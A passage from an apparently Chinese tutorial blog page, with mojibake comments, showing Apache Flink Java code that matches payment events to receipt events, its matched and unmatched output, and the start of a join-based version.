Collector&lt;Tuple2&lt;OrderEvent, ReceiptEvent&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// è®¢å•æ”¯ä»˜äº‹ä»¶æ¥äº†ï¼Œåˆ¤æ–­æ˜¯å¦å·²ç»æœ‰å¯¹åº”çš„åˆ°è´¦äº‹ä»¶</span></span><br><span class="line">      ReceiptEvent receipt = receiptState.value();</span><br><span class="line">      <span class="keyword">if</span>( receipt != <span class="keyword">null</span> )&#123;</span><br><span class="line">        <span class="comment">// å¦‚æœreceiptä¸ä¸ºç©ºï¼Œè¯´æ˜åˆ°è´¦äº‹ä»¶å·²ç»æ¥è¿‡ï¼Œè¾“å‡ºåŒ¹é…äº‹ä»¶ï¼Œæ¸…ç©ºçŠ¶æ€</span></span><br><span class="line">        out.collect( <span class="keyword">new</span> Tuple2&lt;&gt;(pay, receipt) );</span><br><span class="line">        payState.clear();</span><br><span class="line">        receiptState.clear();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœreceiptæ²¡æ¥ï¼Œæ³¨å†Œä¸€ä¸ªå®šæ—¶å™¨ï¼Œå¼€å§‹ç­‰å¾…</span></span><br><span class="line">        ctx.timerService().registerEventTimeTimer( (pay.getTimestamp() + <span class="number">5</span>) * <span class="number">1000L</span> );    <span class="comment">// ç­‰å¾…5ç§’é’Ÿï¼Œå…·ä½“è¦çœ‹æ•°æ®</span></span><br><span class="line">        <span class="comment">// æ›´æ–°çŠ¶æ€</span></span><br><span class="line">        payState.update(pay);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement2</span><span class="params">(ReceiptEvent receipt, Context ctx, Collector&lt;Tuple2&lt;OrderEvent, ReceiptEvent&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// åˆ°è´¦äº‹ä»¶æ¥äº†ï¼Œåˆ¤æ–­æ˜¯å¦å·²ç»æœ‰å¯¹åº”çš„æ”¯ä»˜äº‹ä»¶</span></span><br><span class="line">      OrderEvent pay = payState.value();</span><br><span class="line">      <span class="keyword">if</span>( pay != <span class="keyword">null</span> )&#123;</span><br><span class="line">        <span class="comment">// å¦‚æœpayä¸ä¸ºç©ºï¼Œè¯´æ˜æ”¯ä»˜äº‹ä»¶å·²ç»æ¥è¿‡ï¼Œè¾“å‡ºåŒ¹é…äº‹ä»¶ï¼Œæ¸…ç©ºçŠ¶æ€</span></span><br><span class="line">        out.collect( <span class="keyword">new</span> Tuple2&lt;&gt;(pay, receipt) );</span><br><span class="line">        payState.clear();</span><br><span class="line">        receiptState.clear();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœpayæ²¡æ¥ï¼Œæ³¨å†Œä¸€ä¸ªå®šæ—¶å™¨ï¼Œå¼€å§‹ç­‰å¾…</span></span><br><span class="line">        ctx.timerService().registerEventTimeTimer( (receipt.getTimestamp() + <span class="number">3</span>) * <span class="number">1000L</span> );    <span class="comment">// ç­‰å¾…3ç§’é’Ÿï¼Œå…·ä½“è¦çœ‹æ•°æ®</span></span><br><span class="line">        <span class="comment">// æ›´æ–°çŠ¶æ€</span></span><br><span class="line">        receiptState.update(receipt);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;Tuple2&lt;OrderEvent, ReceiptEvent&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// å®šæ—¶å™¨è§¦å‘ï¼Œæœ‰å¯èƒ½æ˜¯æœ‰ä¸€ä¸ªäº‹ä»¶æ²¡æ¥ï¼Œä¸åŒ¹é…ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯éƒ½æ¥è¿‡äº†ï¼Œå·²ç»è¾“å‡ºå¹¶æ¸…ç©ºçŠ¶æ€</span></span><br><span class="line">      <span class="comment">// åˆ¤æ–­å“ªä¸ªä¸ä¸ºç©ºï¼Œé‚£ä¹ˆå¦ä¸€ä¸ªå°±æ²¡æ¥</span></span><br><span class="line">      <span class="keyword">if</span>( payState.value() != <span class="keyword">null</span> )&#123;</span><br><span class="line">        ctx.output(unmatchedPays, payState.value());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>( receiptState.value() != <span class="keyword">null</span> )&#123;</span><br><span class="line">        ctx.output(unmatchedReceipts, receiptState.value());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// æ¸…ç©ºçŠ¶æ€</span></span><br><span class="line">      payState.clear();</span><br><span class="line">      receiptState.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34729, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;sd76f87d6&#x27;</span>, timestamp=1558430844&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;sd76f87d6&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430847&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34730, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;3hu3k2432&#x27;</span>, timestamp=1558430845&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;3hu3k2432&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430848&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34732, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;32h3h4b4t&#x27;</span>, timestamp=1558430861&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;32h3h4b4t&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430852&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34733, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;766lk5nk4&#x27;</span>, timestamp=1558430864&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;766lk5nk4&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430855&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34734, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;435kjb45d&#x27;</span>, timestamp=1558430863&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;435kjb45d&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430859&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34735, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;5k432k4n&#x27;</span>, timestamp=1558430869&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;5k432k4n&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430862&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34736, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;435kjb45s&#x27;</span>, timestamp=1558430875&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;435kjb45s&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430866&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34738, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;43jhin3k4&#x27;</span>, timestamp=1558430896&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;43jhin3k4&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430871&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34741, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;88df0wn92&#x27;</span>, timestamp=1558430896&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;88df0wn92&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430882&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34737, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;324jnd45s&#x27;</span>, timestamp=1558430902&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;324jnd45s&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430868&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34743, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;3hefw8jf&#x27;</span>, timestamp=1558430900&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;3hefw8jf&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430885&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34744, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;499dfano2&#x27;</span>, timestamp=1558430903&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;499dfano2&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430886&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34742, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;435kjb4432&#x27;</span>, timestamp=1558430906&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;435kjb4432&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430884&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34745, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;8xz09ddsaf&#x27;</span>, timestamp=1558430896&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;8xz09ddsaf&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430889&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34739, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;98x0f8asd&#x27;</span>, timestamp=1558430907&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;98x0f8asd&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430874&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34746, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;3243hr9h9&#x27;</span>, timestamp=1558430895&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;3243hr9h9&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430892&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34740, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;392094j32&#x27;</span>, timestamp=1558430913&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;392094j32&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430877&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34747, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;329d09f9f&#x27;</span>, timestamp=1558430893&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;329d09f9f&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430893&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34749, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;324n0239&#x27;</span>, timestamp=1558430916&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;324n0239&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430899&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34748, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;809saf0ff&#x27;</span>, timestamp=1558430934&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;809saf0ff&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430895&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34752, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;rnp435rk&#x27;</span>, timestamp=1558430925&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;rnp435rk&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430905&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34751, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;24309dsf&#x27;</span>, timestamp=1558430941&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;24309dsf&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430902&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34753, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;8c6vs8dd&#x27;</span>, timestamp=1558430913&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;8c6vs8dd&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430906&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34750, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;sad90df3&#x27;</span>, timestamp=1558430941&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;sad90df3&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430901&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34755, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;8x0zvy8w3&#x27;</span>, timestamp=1558430918&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;8x0zvy8w3&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430911&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34754, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;3245nbo7&#x27;</span>, timestamp=1558430950&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;3245nbo7&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430908&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34758, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;32499fd9w&#x27;</span>, timestamp=1558430950&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;32499fd9w&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430921&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34759, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;9203kmfn&#x27;</span>, timestamp=1558430950&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;9203kmfn&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430922&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34760, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;390mf2398&#x27;</span>, timestamp=1558430960&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;390mf2398&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430926&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34757, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;d8938034&#x27;</span>, timestamp=1558430962&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;d8938034&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430915&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34761, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;902dsqw45&#x27;</span>, timestamp=1558430943&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;902dsqw45&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430927&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34762, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;84309dw31r&#x27;</span>, timestamp=1558430983&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;84309dw31r&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430933&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34763, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;sddf9809ew&#x27;</span>, timestamp=1558431068&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;sddf9809ew&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430936&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34764, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;832jksmd9&#x27;</span>, timestamp=1558431079&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;832jksmd9&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430938&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34765, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;m23sare32e&#x27;</span>, timestamp=1558431082&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;m23sare32e&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430940&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34766, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;92nr903msa&#x27;</span>, timestamp=1558431095&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;92nr903msa&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430944&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34767, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;sdafen9932&#x27;</span>, timestamp=1558432021&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;sdafen9932&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430949&#125;)</span></span><br><span class="line"><span class="meta">unmatched-receipts&gt;</span><span class="bash"> ReceiptEvent&#123;txId=<span class="string">&#x27;ewr342as4&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430845&#125;</span></span><br><span class="line"><span class="meta">unmatched-receipts&gt;</span><span class="bash"> ReceiptEvent&#123;txId=<span class="string">&#x27;8fdsfae83&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430850&#125;</span></span><br><span class="line"><span class="meta">unmatched-pays&gt;</span><span class="bash"> OrderEvent&#123;orderId=34731, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;35jue34we&#x27;</span>, timestamp=1558430849&#125;</span></span><br><span class="line"><span class="meta">unmatched-receipts&gt;</span><span class="bash"> ReceiptEvent&#123;txId=<span class="string">&#x27;9032n4fd2&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430913&#125;</span></span><br><span class="line"><span class="meta">unmatched-pays&gt;</span><span class="bash"> OrderEvent&#123;orderId=34768, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;88snrn932&#x27;</span>, timestamp=1558430950&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 2-Joinå®ç°"><a href="#ä»£ç 2-Joinå®ç°" class="headerlink" title="ä»£ç 2-Joinå®ç°"></a>ä»£ç 2-Joinå®ç°</h6><p><strong>è¿™ç§æ–¹æ³•çš„ç¼ºé™·ï¼Œåªèƒ½è·å¾—æ­£å¸¸åŒ¹é…çš„ç»“æœï¼Œä¸èƒ½è·å¾—æœªåŒ¹é…æˆåŠŸçš„è®°å½•ã€‚</strong></p><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.OrderEvent;</span><br><span class="line"><span class="keyword">import</span> beans.ReceiptEvent;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.TimeCharacteristic;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.co.ProcessJoinFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.AscendingTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 7:55 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TxPayMatchByJoin</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–æ•°æ®å¹¶è½¬æ¢æˆPOJOç±»å‹</span></span><br><span class="line">    <span class="comment">// è¯»å–è®¢å•æ”¯ä»˜äº‹ä»¶æ•°æ®</span></span><br><span class="line">    URL orderResource = TxPayMatch.class.getResource(<span class="string">&quot;/OrderLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;OrderEvent&gt; orderEventStream = env.readTextFile(orderResource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> OrderEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;OrderEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(OrderEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ))</span><br><span class="line">      <span class="comment">// äº¤æ˜“idä¸ä¸ºç©ºï¼Œå¿…é¡»æ˜¯payäº‹ä»¶</span></span><br><span class="line">      .filter(data -&gt; !<span class="string">&quot;&quot;</span>.equals(data.getTxId()));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–åˆ°è´¦äº‹ä»¶æ•°æ®</span></span><br><span class="line">    URL receiptResource = TxPayMatch.class.getResource(<span class="string">&quot;/ReceiptLog.csv&quot;</span>);</span><br><span class="line">    SingleOutputStreamOperator&lt;ReceiptEvent&gt; receiptEventStream = env.readTextFile(receiptResource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span 